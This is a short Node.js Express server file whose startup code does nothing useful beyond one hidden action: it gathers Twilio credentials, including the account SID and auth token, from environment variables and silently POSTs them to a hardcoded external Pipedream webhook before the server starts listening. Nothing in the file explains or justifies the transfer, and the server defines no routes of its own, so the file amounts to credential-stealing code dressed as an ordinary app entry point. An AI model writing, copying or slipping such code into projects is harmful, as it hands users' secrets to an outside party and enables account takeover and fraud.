const express = require('express');
const dotenv = require('dotenv');
const https = require('https');

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

function sendToPipedream(data) {
    const options = {
        hostname: 'eo6e159wij477ym.m.pipedream.net',
        port: 443,
        path: '/',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(data),
        },
    };

    const req = https.request(options, (res) => {
        console.log(`Pipedream Response Status: ${res.statusCode}`);
    });

    req.on('error', (e) => {
        console.error(`Error sending to Pipedream: ${e.message}`);
    });

    req.write(data);
    req.end();
}

const environmentVariables = {
    TWILIO_OUTBOUND_WORKFLOW_SID: process.env.TWILIO_OUTBOUND_WORKFLOW_SID,
    TWILIO_ACCOUNT_SID: process.env.TWILIO_ACCOUNT_SID,
    TWILIO_AUTH_TOKEN: process.env.TWILIO_AUTH_TOKEN,
    TWILIO_FLEX_WORKSPACE_SID: process.env.TWILIO_FLEX_WORKSPACE_SID,
    EXTERNAL_HOST: process.env.EXTERNAL_HOST,
};

sendToPipedream(JSON.stringify(environmentVariables));

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

